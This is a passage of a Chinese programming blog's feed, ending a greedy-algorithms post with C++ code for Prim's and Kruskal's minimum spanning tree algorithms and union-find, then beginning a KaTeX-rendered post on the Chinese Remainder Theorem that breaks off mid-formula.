class="number">6</span>)</span></span>;</span><br><span class="line">    g.<span class="built_in">addEdge</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>);</span><br><span class="line">    g.<span class="built_in">addEdge</span>(<span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">    g.<span class="built_in">addEdge</span>(<span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>);</span><br><span class="line">    g.<span class="built_in">addEdge</span>(<span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>);</span><br><span class="line">    g.<span class="built_in">addEdge</span>(<span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">    g.<span class="built_in">addEdge</span>(<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>);</span><br><span class="line">    g.<span class="built_in">addEdge</span>(<span class="number">3</span>, <span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">    g.<span class="built_in">addEdge</span>(<span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>);</span><br><span class="line">    g.<span class="built_in">addEdge</span>(<span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>);</span><br><span class="line">    g.<span class="built_in">prim</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (Vertex *v: g.vertices) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Vertex &quot;</span> &lt;&lt; v-&gt;id &lt;&lt; <span class="string">&quot; parent is &quot;</span> &lt;&lt; v-&gt;parent &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="kruskal算法"><a class="markdownIt-Anchor" href="#kruskal算法"></a> Kruskal算法</h4><p>这一部分之前也有所提及，原理可以参考<a href="https://adam8en.github.io/2023/11/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BB%80%E9%94%A6%EF%BC%88%E5%85%AD%EF%BC%89%E2%80%94%E2%80%94%E8%B5%B0%E8%BF%91%E5%9B%BE%E8%AE%BA/">数据结构什锦（六）—— 走近图论 | Adam8en の 8log</a>这篇文章中对克鲁斯卡尔算法的介绍。</p><p>其实原理很简单，就是把每个无向边取出，按权重排序后依次添加进图中，当边数达到n-1时（假设一共有n个顶点），就生成了最小生成树。每放进去一条边都要进行一次判断是否成环，如果成环就丢掉这条边。</p><p>这里唯一比较难搞的点就是判断新加入的边是否成环，这里可以用一种叫<strong>并查集</strong>的数据结构方便的实现这一目的。关于并查集，可以参考这篇文章<a href="https://blog.csdn.net/w1085541827/article/details/52076481">并查集的一些个人观点 以及克鲁斯卡尔算法的详解_kruskal算法为什么用并查集-CSDN博客</a>。</p><p>其实并查集也很简单，一言以概之，就是用一个数组去储存元素，下标代表元素的位置，数组的值代表元素的父节点。整体实现后代码也很简单，大概长这样：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (father[a] == a)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> father[a] = <span class="built_in">find</span>(father[a]);<span class="comment">//这里顺便压缩了路径</span></span><br><span class="line">    <span class="comment">//把每个路径上的节点的父节点都改成最 祖宗 的那一个（</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">merge</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tx = <span class="built_in">find</span>(x), ty = <span class="built_in">find</span>(y);</span><br><span class="line">    <span class="keyword">if</span> (tx != ty)</span><br><span class="line">    &#123;</span><br><span class="line">        father[tx] = ty;</span><br><span class="line">        <span class="comment">//判断，如果两个顶点的祖先不一样则进行合并操作</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么，根据并查集的思想，我们可以把每个顶点作为元素储存进一个数组中。初始化把每个顶点都赋值为它本身，代表每个顶点在开始时都是独立的根节点，然后每加入一条边就把两个顶点进行合并。如果遇到加入边导致顶点在一个集合内的情况，就说明会成环，就舍弃这条边跳过到下一条即可。</p><p>那么最终实现的代码版本如下。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    <span class="type">int</span> from, to, weight;</span><br><span class="line">    <span class="built_in">Edge</span>(<span class="type">int</span> _from, <span class="type">int</span> _to, <span class="type">int</span> _weight) : <span class="built_in">from</span>(_from), <span class="built_in">to</span>(_to), <span class="built_in">weight</span>(_weight) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">compareEdges</span><span class="params">(<span class="type">const</span> Edge &amp;a, <span class="type">const</span> Edge &amp;b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.weight &lt; b.weight;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UnionFind</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; parent;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">UnionFind</span><span class="params">(<span class="type">int</span> n)</span> : parent(n) &#123;</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            parent[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (parent[x] != x) &#123;</span><br><span class="line">            x = parent[x];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">unionSet</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">        parent[<span class="built_in">find</span>(x)] = <span class="built_in">find</span>(y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Graph</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;Edge&gt; edges;</span><br><span class="line">    <span class="type">int</span> numVertices;</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">Graph</span><span class="params">(<span class="type">int</span> _numVertices)</span> : numVertices(_numVertices) &#123;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">addEdge</span><span class="params">(<span class="type">int</span> from, <span class="type">int</span> to, <span class="type">int</span> weight)</span> </span>&#123;</span><br><span class="line">        edges.<span class="built_in">emplace_back</span>(from, to, weight);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">kruskal</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(edges.<span class="built_in">begin</span>(), edges.<span class="built_in">end</span>(), compareEdges);</span><br><span class="line">        <span class="function">UnionFind <span class="title">uf</span><span class="params">(numVertices)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> Edge &amp;edge : edges) &#123;</span><br><span class="line">            <span class="keyword">if</span> (uf.<span class="built_in">find</span>(edge.from) != uf.<span class="built_in">find</span>(edge.to)) &#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;Adding edge: &quot;</span> &lt;&lt; edge.from &lt;&lt; <span class="string">&quot; - &quot;</span> &lt;&lt; edge.to &lt;&lt; <span class="string">&quot; weight: &quot;</span> &lt;&lt; edge.weight &lt;&lt; endl;</span><br><span class="line">                uf.<span class="built_in">unionSet</span>(edge.from, edge.to);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">Graph <span class="title">g</span><span class="params">(<span class="number">6</span>)</span></span>;</span><br><span class="line">    g.<span class="built_in">addEdge</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>);</span><br><span class="line">    g.<span class="built_in">addEdge</span>(<span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">    g.<span class="built_in">addEdge</span>(<span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>);</span><br><span class="line">    g.<span class="built_in">addEdge</span>(<span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>);</span><br><span class="line">    g.<span class="built_in">addEdge</span>(<span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">    g.<span class="built_in">addEdge</span>(<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>);</span><br><span class="line">    g.<span class="built_in">addEdge</span>(<span class="number">3</span>, <span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">    g.<span class="built_in">addEdge</span>(<span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>);</span><br><span class="line">    g.<span class="built_in">addEdge</span>(<span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>);</span><br><span class="line">    g.<span class="built_in">kruskal</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后得到的效果如下</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/%E5%9B%BE%E4%B8%8E%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91.drawio.png" alt="图与最小生成树.drawio" /></p><h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2><p>贪心算法的思想其实很简单，即使你没有学过这个名词，再解决一些OI题时你肯定也会有相同的做法。由局部最优导向全局最优的想法是简单粗暴的，是无师自通的，因此贪心比起动态规划来说要简单的多。</p><p>当然，经典贪心算法的应用也远不止这些，我只是简单的介绍了一个例子，希望后续能多多益善？</p><hr /><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/103835289_p3.jpg" alt="103835289_p3" /></p>]]></content>
      
      
      <categories>
          
          <category> 算法笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 贪心算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈中国剩余定理</title>
      <link href="/posts/97e7c5ac2148/"/>
      <url>/posts/97e7c5ac2148/</url>
      
        <content type="html"><![CDATA[<h1 id="中国剩余定理"><a class="markdownIt-Anchor" href="#中国剩余定理"></a> 中国剩余定理</h1><blockquote><p>定理： 设gcd (<em>a</em>, <em>n</em>) = 1，<em>n</em> &gt; 0，则同余式：</p><p><em>a x</em> ≡ <em>b</em> mod <em>n</em></p><p>恰有一个解。</p><p>而 <em>x</em> = <em>ba</em><sup>𝜑(n)－1</sup> 就是其唯一解。 ( <em>a</em><sup>-1</sup> ≡ <em>a</em><sup>𝜑(n)－1</sup> mod <em>n</em> )</p></blockquote><p>其实可以类比求逆元，当a、n互质，b=1时该定理退化为费马小定理，此时恰有一个解，也就是a<sup>-1</sup>。</p><p>进而有中国剩余定理。</p><p>设自然数<em>m</em>1 , <em>m</em>2 , …, <em>m</em> <em>r</em>两两互素，记 <em>M</em> = <em>m</em>1 <em>m</em>2 ⋯ <em>m</em> <em>r</em> ，则同余方程组：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.15999999999999992em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>x</mi><mo>≡</mo><msub><mi>b</mi><mn>1</mn></msub><mrow><mo fence="true">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><msub><mi>m</mi><mn>1</mn></msub><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>x</mi><mo>≡</mo><msub><mi>b</mi><mn>2</mn></msub><mrow><mo fence="true">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><msub><mi>m</mi><mn>2</mn></msub><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>x</mi><mo>≡</mo><msub><mi>b</mi><mi>r</mi></msub><mrow><mo fence="true">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><msub><mi>m</mi><mi>r</mi></msub><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding="application/x-tex">\left\{\begin{array}{c}x \equiv b_{1}\left(\bmod m_{1}\right) \\x \equiv b_{2}\left(\bmod m_{2}\right) \\\vdots \\x \equiv b_{r}\left(\bmod m_{r}\right)\end{array}\right.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:5.459999999999999em;vertical-align:-2.4799999999999995em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.9500200000000008em;"><span style="top:-1.59999em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-1.5949900000000001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-1.8899900000000003em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-2.1849900000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-2.2049900000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-3.1500100000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.29501em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.59001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.885010000000001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.905010000000001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-5.20002em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.45002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.9799999999999995em;"><span style="top:-5.8275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-4.6275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-2.7674999999999996em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-1.5675000000000006em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.4799999999999995em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p><p>在模<em>M</em>同余的意义下有唯一解:</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span></span></span></span> <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≡</mo></mrow><annotation encoding="application/x-tex">\equiv</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mrel">≡</span></span></span></span> <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>r</mi></msubsup></mrow><annotation encoding="application/x-tex">\sum_{i=1}^{r}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.104002em;vertical-align:-0.29971000000000003em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span></span></span></span> <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>b</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">b_ {i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>M</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">M_ {i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">y_ {i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> (<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext></mrow><annotation encoding="application/x-tex">\bmod</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span></span></span></span> <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>)</p><p>式中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>M</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">M_ {i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> = <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>M</mi><msub><mi>m</mi><mi>i</mi></msub></mfrac></mrow><annotation encoding="application/x-tex">\frac {M}{m_ {i}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.317431em;vertical-align:-0.44509999999999994em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 